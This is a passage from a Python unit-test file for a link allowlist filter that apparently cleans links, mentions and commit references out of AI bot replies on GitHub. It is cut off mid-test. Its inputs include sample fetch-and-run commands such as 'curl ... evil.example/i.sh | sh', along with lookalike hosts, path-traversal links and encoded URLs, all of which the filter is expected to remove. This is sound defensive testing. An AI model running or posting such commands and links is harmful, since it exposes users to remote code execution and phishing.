@@ -1,0 +1,724 @@
+"""Unit tests of link_filter.py, the allowlist the Claude bots' replies pass.
+
+Run: python3 -m unittest discover -s .github/scripts -p 'test_*.py'
+"""
+
+from __future__ import annotations
+
+import os
+import subprocess
+import sys
+import tempfile
+import time
+import unittest
+from pathlib import Path
+
+from link_filter import (
+    FALLBACK_NOTE,
+    REMOVED,
+    FilterTooComplex,
+    Policy,
+    StaticChecker,
+    filter_links,
+    filter_text,
+    host_allowed,
+    is_commonmark_open_tag,
+    path_allowed,
+    plain_fallback,
+    rendered_link_failures,
+)
+
+SCRIPT = Path(__file__).resolve().parent / "link_filter.py"
+GOOD = "0123456789abcdef0123456789abcdef01234567"  # on the default branch
+FORK = "fedcba9876543210fedcba9876543210fedcba98"  # only in a fork
+CHECKER = StaticChecker(
+    default_branches={"Dv2Corn/still-ui": "main", "MHSanaei/3x-ui": "main", "XTLS/Xray-core": "main", "XTLS/REALITY": "main"},
+    tags={"Dv2Corn/still-ui": {"v1.5.0", "v1.5.1"}},
+    shas={"Dv2Corn/still-ui": {GOOD}},
+)
+POLICY = Policy(checker=CHECKER)
+
+
+class HostTest(unittest.TestCase):
+    def test_allowed_hosts(self):
+        for host in ("github.com", "GitHub.com", "docs.github.com", "raw.githubusercontent.com", "xtls.github.io"):
+            self.assertTrue(host_allowed(host), host)
+
+    def test_lookalikes_are_not_allowed(self):
+        for host in ("github.com.evil.example", "evilgithub.com", "github.co", "github.com.", ".github.com",
+                     "a..github.com", "-x.github.com", "githubusercontent.com", "evil.githubusercontent.com",
+                     "gist.github.com", "www.github.com", "a.b.github.com", "objects.githubusercontent.com",
+                     "user-images.githubusercontent.com", "avatars.githubusercontent.com",
+                     "other.github.io", "xtls.github.io.evil.example", "gіthub.com"):
+            self.assertFalse(host_allowed(host), host)
+
+
+class FilterTest(unittest.TestCase):
+    def assertFiltered(self, text, expected, removed, policy=POLICY):
+        out, n = filter_links(text, policy)
+        self.assertEqual(out, expected)
+        self.assertEqual(n, removed, out)
+
+    def assertKept(self, text):
+        self.assertFiltered(text, text, 0)
+
+    def test_github_links_stay(self):
+        for text in (
+            f"https://github.com/Dv2Corn/still-ui/blob/{GOOD}/web/x.go#L10-L12",
+            "[x.go:10](https://github.com/Dv2Corn/still-ui/blob/main/web/x.go#L10)",
+            "<https://github.com/Dv2Corn/still-ui/issues/3>",
+            "see https://docs.github.com/en/actions.",
+            "(https://docs.github.com/en/actions/security-guides)",
+            "HTTPS://GITHUB.COM/Dv2Corn/still-ui",
+            "http://github.com/dv2corn/STILL-UI/pull/3",
+            "https://github.com/Dv2Corn/still-ui.git",
+            "https://github.com/MHSanaei/3x-ui/issues/7042",
+            "https://github.com/mhsanaei/3x-ui/blob/main/x-ui.sh#L5",
+            "https://github.com/XTLS",
+            "https://github.com/XTLS/Xray-core/pull/5000",
+            "https://github.com/XTLS/REALITY/blob/main/tls.go",
+            "https://raw.githubusercontent.com/XTLS/Xray-core/main/go.mod",
+            "https://raw.githubusercontent.com/MHSanaei/3x-ui/refs/heads/main/install.sh",
+            "https://github.com/Dv2Corn/still-ui/blob/main/docs/a%20b.md?plain=1#L2",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main/install.sh",
+            "https://xtls.github.io/config/inbounds/vless.html",
+            "[docs](//github.com/Dv2Corn/still-ui/tree/main/docs)",
+            '<a href="https://github.com/Dv2Corn/still-ui">x</a> '
+            '<img src="https://raw.githubusercontent.com/Dv2Corn/still-ui/main/a.png" alt="Note: x">',
+            '<a title="a > b" href="https://github.com/Dv2Corn/still-ui/issues/1">x</a>',
+            "[ref]: https://github.com/Dv2Corn/still-ui/pull/9",
+            "https://github.com/Dv2Corn/still-ui/compare/v1.5.0...v1.5.1",
+            "https://github.com/Dv2Corn/still-ui/issues?q=is%3Aopen+label%3Abug",
+        ):
+            self.assertKept(text)
+
+    def test_relative_links_and_plain_text_stay(self):
+        for text in (
+            "[pr](../pull/3), [other](12), [query](?q=is%3Aopen)",
+            "[file](../blob/main/docs/content/docs/en/help/faq.mdx)",
+            "[top](#top)",
+            "[issue](/Dv2Corn/still-ui/issues/1)",
+            "[x](<docs/a b.md>)",
+            "//go:embed dist",
+            "// comment.example here",
+            "x := a // see b.go",
+            "config.json, x-ui.db and install.sh",
+            "#12, GH-12 and @Dv2Corn",
+            "<!-- claude-issue:run 5 -->\n<!-- claude-issue:analyst -->",
+            "Reviewed head: 0123456789abcdef0123456789abcdef01234567",
+            "if a < b and c > d",
+            "arr[i](x)",
+            "github.com/mhsanaei/3x-ui/v3@v3.11.0 and golang.org/x/crypto@v0.40.0",
+            "pkg@latest, icon@2x.png, logo@1.5x.webp, `go install x@v1.2.3-beta`",
+            "user @ host, a@b",
+            "Tel: +1 and hotel:x and Note: y",
+            "map[string]: x and [label]: ../pull/2",
+            "List<String> and Vec<T> and <b>bold</b>",
+        ):
+            self.assertKept(text)
+
+    def test_github_outside_the_allowed_repositories_goes(self):
+        for url in (
+            "https://github.com/attacker/tools/releases/download/v1/fix.sh",
+            "https://github.com/attacker",
+            "https://github.com/",
+            "https://github.com",
+            "https://github.com/search?q=a",
+            "https://gist.github.com/attacker/0123abcd",
+            "https://github.com/user-attachments/assets/0123-4567",
+            "https://github.com/user-attachments/files/1/fix.zip",
+            "https://raw.githubusercontent.com/attacker/r/main/x.sh",
+            "https://objects.githubusercontent.com/github-production-release-asset/1",
+            "https://www.github.com/Dv2Corn/still-ui",
+            "https://github.com/Dv2Corn/still-ui-evil/x",
+            "https://github.com/Dv2Corn/still-uix",
+            "https://github.com/Dv2Corn",
+            "https://github.com/MHSanaei/other",
+            "https://github.com/XTLSx/Xray-core",
+            "https://github.com/Dv2Corn/still-ui/../../attacker/x",
+            "https://github.com/Dv2Corn/still-ui/./../attacker/x",
+            "https://github.com/Dv2Corn/still-ui/%2e%2e/%2E%2E/attacker/x",
+            "https://github.com/Dv2Corn%2Fstill-ui/x",
+            "https://github.com/attacker%2F..%2FDv2Corn/still-ui",
+            "https://github.com//attacker/x",
+            "https://github.com/Dv2Corn//still-ui",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main/../../../attacker/r/main/x.sh",
+        ):
+            out, n = filter_links(f"x {url} y", POLICY)
+            self.assertEqual((out, n), (f"x {REMOVED} y", 1), url)
+        self.assertFiltered("[fix](https://github.com/attacker/r/raw/main/fix.sh)", f"fix {REMOVED}", 1)
+        self.assertFiltered('<a href="https://gist.github.com/a/b">x</a>', f"{REMOVED}x</a>", 1)
+        self.assertFalse(path_allowed("github.com", "/Dv2Corn/still-ui\\..\\x"))
+
+    def test_any_scheme_and_any_place(self):
+        self.assertFiltered("see https://evil.example/x.", f"see {REMOVED}.", 1)
+        self.assertFiltered("`curl -fsSL https://evil.example/i.sh | sh`", f"`curl -fsSL {REMOVED} | sh`", 1)
+        self.assertFiltered("```\nwget http://evil.example/x\n```", f"```\nwget {REMOVED}\n```", 1)
+        for scheme in ("ftp", "git", "ssh", "vless", "x-y.z+1", "FILE"):
+            self.assertFiltered(f"a {scheme}://evil.example/x b", f"a {REMOVED} b", 1)
+        self.assertFiltered("ftp://github.com/x", REMOVED, 1)
+        self.assertFiltered("(https://evil.example/a_(b))", f"({REMOVED})", 1)
+
+    def test_tricks_with_the_host(self):
+        for url in (
+            "https://github.com@evil.example/",
+            "https://user:pass@github.com/",
+            "https://github.com.evil.example/",
+            "https://github.com:443/x",
+            "https://github.com:8443@evil.example/",
+            "https://evil.example\\@github.com/",
+            "https://github.com\\.evil.example/",
+            "https:\\/\\/evil.example/",
+            "https:/\\evil.example/",
+            "https://github.com%2F@evil.example/",
+            "https://gіthub.com/",
+            "https://GITHUB.COM.EVIL.EXAMPLE/",
+        ):
+            out, n = filter_links(f"x {url} y", POLICY)
+            self.assertEqual(n, 1, url)
+            self.assertNotIn("evil", out.lower(), url)
+            self.assertEqual(out, f"x {REMOVED} y", url)
+
+    def test_entities_hiding_a_url(self):
+        self.assertFiltered("ht&#116;ps&#58;&#x2F;&#x2f;evil.example/x", REMOVED, 1)
+        self.assertFiltered("[t](https&#58;//evil.example)", f"t {REMOVED}", 1)
+        self.assertFiltered("[t](https://github.com&#64;evil.example/)", f"t {REMOVED}", 1)
+        self.assertFiltered('<a href="https&#x3a;//evil.example">t</a>', f"{REMOVED}t</a>", 1)
+        self.assertFiltered("[t](ht&Tab;tps://evil.example)", f"t {REMOVED}", 1)
+        # Markup entities stay encoded.
+        self.assertKept("&lt;b&gt; &amp; &#42;")
+
+    def test_markdown_inline_links_and_images(self):
+        self.assertFiltered("[the fix](https://evil.example/fix.sh)", f"the fix {REMOVED}", 1)
+        self.assertFiltered('[t](https://evil.example "title")', f"t {REMOVED}", 1)
+        self.assertFiltered("[t](<https://evil.example/a b>)", f"t {REMOVED}", 1)
+        self.assertFiltered("[t](https\\://evil.example)", f"t {REMOVED}", 1)
+        self.assertFiltered("[t](//evil.example/x)", f"t {REMOVED}", 1)
+        self.assertFiltered("[t](/\\evil.example/x)", f"t {REMOVED}", 1)
+        self.assertFiltered("[t](javascript:alert(1))", f"t {REMOVED}", 1)
+        self.assertFiltered("![shot](https://evil.example/a.png)", f"shot {REMOVED}", 1)
+        self.assertFiltered("![](https://evil.example/a.png)", REMOVED, 1)
+        self.assertFiltered("[a [b] c](https://evil.example)", f"a [b] c {REMOVED}", 1)
+        self.assertFiltered(
+            "[![b](https://raw.githubusercontent.com/Dv2Corn/still-ui/main/b.png)](https://evil.example)",
+            f"![b](https://raw.githubusercontent.com/Dv2Corn/still-ui/main/b.png) {REMOVED}",
+            1,
+        )
+        self.assertFiltered(
+            "[https://evil.example](https://github.com/Dv2Corn/still-ui)", f"[{REMOVED}](https://github.com/Dv2Corn/still-ui)", 1
+        )
+        out, n = filter_links("[a [b [c]] d](//evil.example)", POLICY)
+        self.assertEqual(n, 1)
+        self.assertNotIn("evil", out)
+
+    def test_reference_definitions(self):
+        self.assertFiltered("[x][1]\n\n[1]: https://evil.example/a", f"[x][1]\n\n[1]: {REMOVED}", 1)
+        self.assertFiltered('  [x]: <//evil.example> "t"', f'  [x]: {REMOVED} "t"', 1)
+        self.assertFiltered("[x]:\n  https://evil.example", f"[x]: {REMOVED}", 1)
+        self.assertKept("[x]: ../pull/2")
+
+    def test_reference_definitions_inside_containers(self):
+        self.assertFiltered("> [x]: //evil.example/a", f"> [x]: {REMOVED}", 1)
+        self.assertFiltered("> [x]: //3232235777/a", f"> [x]: {REMOVED}", 1)
+        self.assertFiltered("- [x]: //evil.example/a", f"- [x]: {REMOVED}", 1)
+        self.assertFiltered("1. item\n\n   [x]: <//evil/a>", f"1. item\n\n   [x]: {REMOVED}", 1)
+        self.assertFiltered("> [x]:\n> //evil.example/a", f"> [x]: {REMOVED}", 1)
+        self.assertFiltered("> > [x]: \\\\evil/a", f"> > [x]: {REMOVED}", 1)
+        self.assertFiltered("- [x]: &#47;&#47;evil/a", f"- [x]: {REMOVED}", 1)
+
+    def test_protocol_relative_text_after_entity_decoding(self):
+        self.assertFiltered("see &#92;&#92;evil.example/x", f"see {REMOVED}", 1)
+        self.assertFiltered("see &#47;&#47;evil.example/x", f"see {REMOVED}", 1)
+        self.assertFiltered("see \\\\evil.example\\share", f"see {REMOVED}", 1)
+        self.assertFiltered("[t](&#92;&#92;evil/x)", f"t {REMOVED}", 1)
+
+    def test_autolinks_and_www(self):
+        self.assertFiltered("<https://evil.example/a>", REMOVED, 1)
+        self.assertFiltered("<mailto:a@evil.example>", REMOVED, 1)
+        self.assertFiltered("<a@evil.example>", REMOVED, 1)
+        self.assertFiltered("<first.last+tag@mail.evil.example>", REMOVED, 1)
+        self.assertFiltered("go to www.evil.example/b.", f"go to {REMOVED}.", 1)
+        self.assertFiltered("(www.evil.example)", f"({REMOVED})", 1)
+        self.assertFiltered("see //evil.example/c now", f"see {REMOVED} now", 1)
+
+    def test_emails_and_schemes_without_slashes(self):
+        for text in (
+            "mailto:a@evil.example",
+            "MAILTO:a@evil.example?subject=x",
+            "xmpp:a@evil.example",
+            "tel:+15551234567",
+            "sms:+15551234567",
+            "security@evil.example",
+            "first.last+tag@mail.evil.example",
+            "noreply@github.com",
+        ):
+            self.assertFiltered(f"write to {text}.", f"write to {REMOVED}.", 1)
+        self.assertFiltered("[mail us](mailto:a@evil.example)", f"mail us {REMOVED}", 1)
+        self.assertFiltered('<a href="tel:+1555">x</a>', f"{REMOVED}x</a>", 1)
+
+    def test_html_quoted_values_may_hold_angle_brackets(self):
+        self.assertFiltered('<a title=">" href="//3232235777/x">t</a>', f"{REMOVED}t</a>", 1)
+        self.assertFiltered("<a title='>' href=//evil>t</a>", f"{REMOVED}t</a>", 1)
+        self.assertFiltered('<img alt="a>b" src="//evil/x.png">', REMOVED, 1)
+        self.assertFiltered('<a "junk" href=//evil>t</a>', f"{REMOVED}t</a>", 1)
+        self.assertFiltered('<a =x href=//evil>t</a>', f"{REMOVED}t</a>", 1)
+        self.assertFiltered('<a\ttitle="x"\nhref\n=\n"//evil">t</a>', f"{REMOVED}t</a>", 1)
+
+    def test_html_tag_that_never_closes_loses_its_angle_bracket(self):
+        out, n = filter_links('<a href="//3232235777/x" title="never closed\n\nnext paragraph')
+        self.assertNotIn("<a", out)
+        self.assertGreaterEqual(n, 1)
+        out, n = filter_links("<a href=//evil")
+        self.assertNotIn("<a", out)
+        self.assertGreaterEqual(n, 1)
+
+    def test_html(self):
+        self.assertFiltered('<a href="https://evil.example/d">click</a>', f"{REMOVED}click</a>", 1)
+        self.assertFiltered("<A HREF=//evil.example>x</A>", f"{REMOVED}x</A>", 1)
+        self.assertFiltered('<img src="//evil.example/e.png">', REMOVED, 1)
+        self.assertFiltered('<img srcset="a.png 1x, //evil.example/b.png 2x">', REMOVED, 1)
+        self.assertFiltered("<a\n  href='https://evil.example'>x</a>", f"{REMOVED}x</a>", 1)
+        self.assertFiltered('<picture><source srcset="https://evil.example/a.png"></picture>', f"<picture>{REMOVED}</picture>", 1)
+        # A URL in a plain attribute is not a link, but still goes.
+        self.assertFiltered('<b title="https://evil.example">x</b>', f'<b title="{REMOVED}">x</b>', 1)
+
+    def test_counts_every_removal_and_is_idempotent(self):
+        text = "[a](https://evil.example) https://evil.example <https://evil.example> www.evil.example"
+        out, n = filter_links(text, POLICY)
+        self.assertEqual(n, 4)
+        self.assertEqual(filter_links(out, POLICY), (out, 0))
+
+    def test_a_set_aside_span_is_never_a_link_target(self):
+        # <b> is a tag, set aside; GitHub may read it as the destination.
+        self.assertFiltered("[t](<b>)", f"t {REMOVED}", 1)
+        self.assertFiltered('[t](<b title="x">)', f"t {REMOVED}", 1)
+        self.assertFiltered("[x]: <b>", f"[x]: {REMOVED}", 1)
+        self.assertFiltered("> [x]: <i>", f"> [x]: {REMOVED}", 1)
+        # Even a kept autolink: as a destination it is not read as one.
+        self.assertFiltered("[x]: <https://github.com/Dv2Corn/still-ui>", f"[x]: {REMOVED}", 1)
+
+    def test_link_text_holding_link_syntax_drops_the_outer_link(self):
+        self.assertFiltered(
+            "[a [b](https://github.com/Dv2Corn/still-ui) c](https://github.com/Dv2Corn/still-ui/issues/1)",
+            f"a [b](https://github.com/Dv2Corn/still-ui) c {REMOVED}",
+            1,
+        )
+        self.assertFiltered("[a [b]: c](https://github.com/Dv2Corn/still-ui/issues/1)", f"a [b]: c {REMOVED}", 1)
+        out, n = filter_links("[a [b](//evil.example/x) c](https://github.com/Dv2Corn/still-ui/issues/1)", POLICY)
+        self.assertNotIn("evil", out)
+        self.assertEqual(n, 2)
+
+    def test_only_commonmark_open_tags_are_set_aside(self):
+        # Not a tag for CommonMark (a quoted attribute name, a value across a
+        # line): its text is Markdown, and the link in it is read.
+        for text in (
+            '<b "junk" title="[t](//evil.example/x)">',
+            '<b title="a\n[t](//evil.example/x)">',
+            "<b title=x\n\n[t](//evil.example/x)>",
+        ):
+            out, n = filter_links(text, POLICY)
+            self.assertNotIn("evil", out, text)
+            self.assertGreaterEqual(n, 1, text)
+        self.assertKept('<b title="[t](x)">bold</b>')
+
+    def test_relative_links_resolve_against_the_page_they_are_posted_on(self):
+        # Posted on https://github.com/Dv2Corn/still-ui/issues/1.
+        for target in (
+            "/attacker/repo",
+            "../../../attacker/repo",
+            "../../../../attacker/repo/blob/main/x.sh",
+            "/attacker/repo/releases/download/v1/fix.sh",
+            "../files/1/fix.zip",
+            "../assets/0123/x.png",
+            "../wiki/Fix",
+            "../blob/0123abc/x.sh",
+            f"../blob/{FORK}/x.sh",
+            "..\\..\\..\\attacker\\repo",
+            "/Dv2Corn",
+            "%2e%2e/%2e%2e/%2e%2e/attacker/r",
+        ):
+            self.assertFiltered(f"[t]({target})", f"t {REMOVED}", 1)
+        self.assertFiltered('<a href="/attacker/r">t</a>', f"{REMOVED}t</a>", 1)
+        self.assertFiltered('<img src="../../../attacker/r/raw/main/x.png">', REMOVED, 1)
+        self.assertFiltered("> [x]: /attacker/r", f"> [x]: {REMOVED}", 1)
+        self.assertFiltered("[x](<../../../attacker/r>)", f"x {REMOVED}", 1)
+
+    def test_the_repository_and_page_come_from_the_policy(self):
+        other = Policy(repo="Other/Proj", base="https://github.com/Other/Proj/pull/5", checker=CHECKER)
+        self.assertFiltered("[t](../issues/2) https://github.com/other/proj/pull/5", "[t](../issues/2) https://github.com/other/proj/pull/5", 0, other)
+        self.assertFiltered("https://github.com/Dv2Corn/still-ui/issues/1", REMOVED, 1, other)
+        self.assertFiltered("[t](../../../Dv2Corn/still-ui/issues/1)", f"t {REMOVED}", 1, other)
+
+    def test_refs_must_be_the_default_branch_a_tag_or_a_commit_it_contains(self):
+        kept = (
+            "https://github.com/Dv2Corn/still-ui/blob/main/x.go",
+            "https://github.com/Dv2Corn/still-ui/tree/main",
+            "https://github.com/Dv2Corn/still-ui/raw/main/install.sh",
+            "https://github.com/Dv2Corn/still-ui/blame/main/x.go#L3",
+            f"https://github.com/Dv2Corn/still-ui/commit/{GOOD}",
+            f"https://github.com/Dv2Corn/still-ui/blob/{GOOD.upper()}/x.go",
+            "https://github.com/Dv2Corn/still-ui/tree/v1.5.1/docs",
+            "https://github.com/Dv2Corn/still-ui/commits",
+            "https://github.com/Dv2Corn/still-ui/commits/main",
+            "https://github.com/Dv2Corn/still-ui/compare",
+            "https://github.com/Dv2Corn/still-ui/compare/v1.5.0...v1.5.1",
+            f"https://github.com/Dv2Corn/still-ui/compare/v1.5.0..{GOOD}",
+            "https://github.com/Dv2Corn/still-ui/archive/refs/tags/v1.5.1.tar.gz",
+            "https://github.com/Dv2Corn/still-ui/archive/main.zip",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/v1.5.1/install.sh",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/tags/v1.5.1/install.sh",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/heads/main/install.sh",
+            f"https://raw.githubusercontent.com/Dv2Corn/still-ui/{GOOD}/install.sh",
+            "https://github.com/Dv2Corn/still-ui/releases",
+            "https://github.com/Dv2Corn/still-ui/releases/latest",
+            "https://github.com/Dv2Corn/still-ui/releases/tag/v1.5.1",
+            "https://github.com/Dv2Corn/still-ui/releases/download/v1.5.1/x-ui-linux-amd64.tar.gz",
+            "https://github.com/Dv2Corn/still-ui/releases/latest/download/x-ui-linux-amd64.tar.gz",
+            "https://github.com/Dv2Corn/still-ui/pull/3/files",
+            "https://github.com/Dv2Corn/still-ui/issues/3#issuecomment-1",
+            "https://github.com/Dv2Corn/still-ui/discussions/4",
+            "https://github.com/MHSanaei/3x-ui/releases/tag/v3.11.0",
+        )
+        for url in kept:
+            self.assertKept(url)
+        removed = (
+            f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/x.sh",
+            f"https://github.com/Dv2Corn/still-ui/commit/{FORK}",
+            f"https://github.com/Dv2Corn/still-ui/tree/{FORK}",
+            "https://github.com/Dv2Corn/still-ui/blob/0123abc/x.sh",
+            "https://github.com/Dv2Corn/still-ui/blob/0123456789abcdef0123456789abcdef0123456/x.sh",
+            "https://github.com/Dv2Corn/still-ui/tree/feature-x",
+            "https://github.com/Dv2Corn/still-ui/blob/v9.9.9/x",
+            "https://github.com/Dv2Corn/still-ui/blob/refs/pull/1/head/x",
+            "https://github.com/Dv2Corn/still-ui/blob",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/" + FORK + "/install.sh",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/pull/1/head/install.sh",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/refs/heads/feature/install.sh",
+            "https://raw.githubusercontent.com/Dv2Corn/still-ui/main",
+            "https://github.com/Dv2Corn/still-ui/compare/main...attacker:still-ui:fix",
+            f"https://github.com/Dv2Corn/still-ui/compare/main...{FORK}",
+            f"https://github.com/Dv2Corn/still-ui/archive/{FORK}.zip",
+            "https://github.com/Dv2Corn/still-ui/archive/main",
+            "https://github.com/MHSanaei/3x-ui/releases/download/v3.11.0/x-ui-linux-amd64.tar.gz",
+            "https://github.com/Dv2Corn/still-ui/releases/expanded_assets/v1.5.1",
+            "https://github.com/Dv2Corn/still-ui/files/123/fix.zip",
+            "https://github.com/Dv2Corn/still-ui/assets/1/0123-4567",
+            "https://github.com/Dv2Corn/still-ui/wiki/Fix",
+            "https://github.com/Dv2Corn/still-ui/find/main",
+            f"https://github.com/XTLS/Xray-core/blob/{GOOD}/x.go",
+        )
+        for url in removed:
+            self.assertFiltered(f"x {url} y", f"x {REMOVED} y", 1)
+
+    def test_the_head_under_review_may_be_linked_in_this_repository_only(self):
+        review = Policy(base="https://github.com/Dv2Corn/still-ui/pull/9", head_sha=FORK, checker=CHECKER)
+        self.assertFiltered(f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/web/x.go#L10", REMOVED, 1)
+        self.assertFiltered(f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/x", f"https://github.com/Dv2Corn/still-ui/blob/{FORK}/x", 0, review)
+        self.assertFiltered(f"https://github.com/MHSanaei/3x-ui/blob/{FORK}/x", REMOVED, 1, review)
+
+    def test_refs_fail_closed_without_answers(self):
+        bare = Policy()
+        self.assertFiltered("https://github.com/Dv2Corn/still-ui/blob/main/x.go", REMOVED, 1, bare)
+        self.assertFiltered(f"https://github.com/Dv2Corn/still-ui/commit/{GOOD}", REMOVED, 1, bare)
+        self.assertFiltered("https://github.com/Dv2Corn/still-ui/issues/3", "https://github.com/Dv2Corn/still-ui/issues/3", 0, bare)
+
+    def test_a_url_is_checked_as_far_as_github_links_it(self):
+        for text in (
+            'https://github.com/Dv2Corn/still-ui"/../../attacker/repo',
+            "https://github.com/Dv2Corn/still-ui]/../../attacker/repo",
+            "https://github.com/Dv2Corn/still-ui'/../../../attacker",
+            "https://github.com/Dv2Corn/still-ui`/../../attacker/repo",
+            "https://github.com/Dv2Corn/still-ui>/../../attacker/repo",
+            "https://github.com/Dv2Corn/still-ui)/../../attacker/repo",
+            "www.github.com/Dv2Corn/still-ui]/../../x",
+        ):
+            out, n = filter_links(text, POLICY)
+            self.assertEqual(n, 1, text)
+            self.assertNotIn("attacker", out, text)
+        for text in (
+            "`https://github.com/Dv2Corn/still-ui`",
+            '"https://github.com/Dv2Corn/still-ui/issues/3"',
+            "'https://github.com/Dv2Corn/still-ui/issues/3',",
+            "(https://github.com/Dv2Corn/still-ui/issues/3).",
+            "https://github.com/Dv2Corn/still-ui/issues/3&amp;",
+            "see https://github.com/Dv2Corn/still-ui/issues/3!",
+            "[https://github.com/Dv2Corn/still-ui](https://github.com/Dv2Corn/still-ui)",
+            "https://github.com/Dv2Corn/still-ui[x](#a)",
+            "bash <(curl -Ls https://raw.githubusercontent.com/Dv2Corn/still-ui/main/install.sh)",
+        ):
+            self.assertKept(text)
+
+
+class ReferenceTest(unittest.TestCase):
+    """Shapes GitHub links or notifies when the page is viewed."""
+
+    def assertNeutralized(self, text, expected, n, policy=POLICY):
+        out, removed, neutralized = filter_text(text, policy)
+        self.assertEqual((out, removed, neutralized), (expected, 0, n))
+
+    def assertKept(self, text, policy=POLICY):
+        self.assertNeutralized(text, text, 0, policy)
+
+    def test_mentions_only_of_the_owner_and_the_author(self):
+        reporter = Policy(checker=CHECKER, author="Reporter")
+        self.assertKept("Thanks @Dv2Corn and @dv2corn.", reporter)
+        self.assertKept("Thanks @reporter.", reporter)
+        self.assertNeutralized("cc @stranger, @XTLS.", "cc `@stranger`, `@XTLS`.", 2, reporter)
+        self.assertNeutralized("cc @reporter", "cc `@reporter`", 1)  # no author given
+        self.assertNeutralized("cc @XTLS/core and @Dv2Corn/team", "cc `@XTLS/core` and `@Dv2Corn/team`", 2)
+        self.assertNeutralized("(@stranger)", "(`@stranger`)", 1)
+
+    def test_cross_repository_references(self):
+        self.assertKept("See MHSanaei/3x-ui#7042, XTLS/Xray-core#1 and Dv2Corn/still-ui#3.")
+        self.assertNeutralized("See SagerNet/sing-box#12.", "See `SagerNet/sing-box#12`.", 1)
+        self.assertKept(f"Fixed in Dv2Corn/still-ui@{GOOD}.")
+        for ref in (f"Dv2Corn/still-ui@{FORK}", "Dv2Corn/still-ui@0123abc", "MHSanaei/3x-ui@282990a",
+                    f"attacker/repo@{GOOD}", f"attacker@{GOOD}", "Dv2Corn@0123abc"):
+            self.assertNeutralized(f"see {ref} now", f"see `{ref}` now", 1)
+
+    def test_bare_shas(self):
+        self.assertKept(f"Fixed by {GOOD}.")
+        for sha in (FORK, "0123abc", "DEADBEEF12", "1234567890"):
+            self.assertNeutralized(f"commit {sha}.", f"commit `{sha}`.", 1)
+        review = Policy(base="https://github.com/Dv2Corn/still-ui/pull/9", head_sha=FORK, checker=CHECKER)
+        self.assertKept(f"Reviewed head: {FORK}", review)
+        # Not a SHA: too short, too long, or part of a word or path.
+        self.assertKept("abc1234x 0x1234567 " + "a" * 64 + " v1.2.3 /0123abc 2096 #1234567")
+
+    def test_code_and_links_are_left_alone(self):
+        self.assertKept("`@stranger SagerNet/sing-box#1 0123abc`")
+        self.assertKept("```\n@stranger 0123abc\n```\n")
+        self.assertKept("~~~~\n@stranger\n~~~\nstill code\n~~~~\n")
+        self.assertKept("[@stranger 0123abc](https://github.com/Dv2Corn/still-ui)")
+        self.assertKept(f"https://github.com/Dv2Corn/still-ui/commit/{GOOD} and https://github.com/Dv2Corn/still-ui/issues/1#x")
+        # A code span ends where its closing run does; what follows is text.
+        self.assertNeutralized("`x`@stranger", "`x` `@stranger`", 1)
+        self.assertNeutralized("``a ` b``@stranger`", "``a ` b`` `@stranger` `", 1)
+        # An unclosed backtick is literal, and a blank line ends a span.
+        self.assertNeutralized("`x @stranger", "`x `@stranger`", 1)
+        self.assertNeutralized("`x\n\n@stranger`", "`x\n\n`@stranger` `", 1)
+        self.assertNeutralized("\\`@stranger`", "\\` `@stranger` `", 1)
+
+
+class ComplexityTest(unittest.TestCase):
+    """Hostile input must not make the text pass slow."""
+
+    def assertFast(self, text, limit=1.0):
+        start = time.monotonic()
+        try:
+            filter_links(text, POLICY)
+        except FilterTooComplex:
+            pass
+        elapsed = time.monotonic() - start
+        self.assertLess(elapsed, limit, f"{elapsed:.2f}s for {text[:30]!r}...")
+        return elapsed
+
+    def test_pathological_inputs_finish_quickly(self):
+        for text in (
+            "<a" + " \n" * 20000 + "x",
+            "<a" + "  x" * 300,
+            "<a" + " \n" * 20000 + ">",
+            "<a " * 20000,
+            '<x "q" ' * 8000 + ">",
+            "<a b=" * 20000,
+            "[a](b" + " " * 50000,
+            "[a" * 20000,
+            "](" * 30000,
+            "]:\n" + ">" * 50000,
+            "https://github.com/Dv2Corn/still-ui" + ")" * 30000,
+            "https://evil.example/" + "&a;" * 20000,
+            "x@" + "a." * 20000 + "b1",
+            "".join("`" * k + "x" for k in range(1, 300)),
+            "@a " * 20000,
+            "a/b#1 " * 10000,
+            "0123abc " * 10000,
+            "&#58;" * 30000,
+            ("<a " * 300 + ">") * 60,
+        ):
+            self.assertFast(text)
+
+    def test_the_open_tag_check_is_linear_and_capped(self):
+        start = time.monotonic()
+        self.assertFalse(is_commonmark_open_tag("<a" + " \n" * 20000 + "x"))
+        self.assertFalse(is_commonmark_open_tag("<a" + " \n" * 900 + "x"))
+        self.assertFalse(is_commonmark_open_tag("<a" + " \t" * 900 + "b" * 100 + "="))
+        # Two spaces between attributes and no `>`: the previous pattern took
+        # 3 s for 22 attributes and four times longer for every two more.
+        self.assertFalse(is_commonmark_open_tag("<a" + "  x" * 300))
+        self.assertFalse(is_commonmark_open_tag("<a" + " \n x" * 200))
+        self.assertTrue(is_commonmark_open_tag("<a" + "  x" * 300 + ">"))
+        self.assertTrue(is_commonmark_open_tag('<a\n  href="x" b c=\'d\' e=f/>'))
+        self.assertFalse(is_commonmark_open_tag('<a href="x\ny">'))
+        self.assertLess(time.monotonic() - start, 1.0)
+
+    def test_too_much_work_fails_closed(self):
+        group = '<x "q" ' * 300 + ">\n\n"
+        with self.assertRaises(FilterTooComplex):
+            filter_links(group * 10, POLICY)
+
+
+class GateTest(unittest.TestCase):
+    def failures(self, rendered, policy=POLICY):
+        return rendered_link_failures(rendered, policy)
+
+    def test_allowed_rendering(self):
+        rendered = (
+            '<p><a href="https://github.com/Dv2Corn/still-ui/issues/12" class="issue-link">#12</a>'
+            '<a class="user-mention notranslate" href="https://github.com/Dv2Corn">@Dv2Corn</a>'
+            '<a class="team-mention" href="https://github.com/orgs/XTLS/teams/core">@XTLS/core</a>'
+            '<a href="#user-content-fn-1">1</a><a id="x" class="anchor" href="#heading"></a>'
+            f'<a href="https://github.com/Dv2Corn/still-ui/commit/{GOOD}"><tt>0123456</tt></a>'
+            '<a href="../pull/3">pr</a>'
+            '<a target="_blank" href="https://camo.githubusercontent.com/aa/bb">'
+            '<img src="https://camo.githubusercontent.com/aa/bb" '
